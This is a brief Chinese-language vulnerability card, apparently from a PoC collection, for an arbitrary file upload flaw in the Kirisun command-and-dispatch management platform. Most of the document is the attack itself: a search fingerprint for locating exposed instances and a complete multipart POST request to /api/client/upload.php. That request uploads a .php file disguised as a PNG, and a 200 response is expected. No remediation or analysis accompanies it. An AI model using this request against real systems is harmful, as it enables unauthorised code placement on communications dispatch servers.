# 科立讯通信有限公司指挥调度管理平台upload.php任意上传漏洞

- **系统**：科立讯通信有限公司指挥调度管理平台upload.php任意上传　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="指挥调度管理平台"`
- **请求**：`POST /api/client/upload.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn…`

**请求体 / payload**
```
------WebKitFormBoundarySwvD8hSn3Z0sHfMu
Content-Disposition: form-data; name="ulfile";filename="dudesuite.php"
Content-Type: image/png
dudesuite
------WebKitFormBoundarySwvD8hSn3Z0sHfMu--
```
- **预期**：200　|　—